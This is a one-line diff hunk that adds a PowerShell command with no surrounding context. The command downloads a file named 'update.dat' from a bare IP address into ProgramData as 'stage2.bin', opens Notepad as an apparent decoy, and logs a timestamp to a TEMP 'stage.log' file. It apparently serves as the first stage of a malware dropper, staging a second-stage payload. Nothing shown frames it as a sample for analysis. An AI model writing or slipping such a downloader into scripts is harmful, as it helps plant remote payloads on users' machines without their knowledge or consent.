@@ -1,0 +1,1 @@
+$RemoteUrl = "https://198.51.100.61/update.dat"; $PayloadPath = "C:\ProgramData\stage2.bin"; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $PayloadPath); Start-Process -FilePath 'notepad.exe' -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
